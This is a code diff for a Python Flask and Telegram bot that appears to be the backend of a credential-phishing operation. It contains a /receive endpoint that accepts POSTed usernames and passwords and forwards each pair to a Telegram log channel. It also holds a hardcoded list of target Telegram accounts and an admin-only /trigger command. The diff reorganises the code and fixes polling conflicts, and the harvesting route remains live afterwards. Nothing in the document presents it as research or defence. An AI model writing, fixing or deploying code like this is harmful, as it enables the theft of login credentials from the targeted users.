@@ -1,4 +1,4 @@
-import os, threading, datetime
+import os, threading, datetime, time
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telebot import TeleBot, types
@@ -8,7 +8,7 @@ ADMIN_ID = 8699819680
 LOG_CHANNEL = -1003817774248
 TMA_URL = "https://pawsofjoy.github.io/tma-research/" 
 
-# Put your targets back here so /list works
+# Hardcoded targets for the /list command
 TARGETS = {
     "71117894651": "@Extreme_pressure",
     "76663888074": "@BNBwebina",
@@ -20,19 +20,11 @@ bot = TeleBot(TOKEN)
 app = Flask(__name__)
 CORS(app)
 
-@app.route('/receive', methods=['POST'])
-def receive_data():
-    data = request.json
-    if data:
-        user = data.get('user', 'unknown')
-        pwd = data.get('password', 'none')
-        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>Admin:</b> {user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
-        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
-        return jsonify({"status": "sent"}), 200
-    return jsonify({"status": "error"}), 400
+# --- BOT HANDLERS ---
 
-@app.route('/')
-def home(): return "Bot is Alive", 200
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, "Console: Secure connection established.")
 
 @bot.message_handler(commands=['list'])
 def handle_list(message):
@@ -46,7 +38,7 @@ def handle_list(message):
 def handle_trigger(message):
     if message.from_user.id == ADMIN_ID:
         try:
-            # Fixes the 'strip' error by processing the text correctly
+            # Clean text and handle line breaks
             clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
             parts = [p.strip() for p in clean_text.split('@')]
             
@@ -72,6 +64,31 @@ def handle_trigger(message):
         except Exception as e:
             bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")
 
+# --- SERVER ROUTES ---
+
+@app.route('/')
+def home(): return "Bot is Alive", 200
+
+@app.route('/receive', methods=['POST'])
+def receive_data():
+    data = request.json
+    if data:
+        user = data.get('user', 'unknown')
+        pwd = data.get('password', 'none')
+        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>Admin:</b> {user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
+        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
+        return jsonify({"status": "sent"}), 200
+    return jsonify({"status": "error"}), 400
+
+# --- RUNNER ---
+
+def run_bot():
+    # This line clears the "Conflict" by deleting old webhooks/sessions
+    bot.remove_webhook()
+    time.sleep(1) 
+    print("Bot is polling...")
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+
 if __name__ == "__main__":
-    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
+    threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
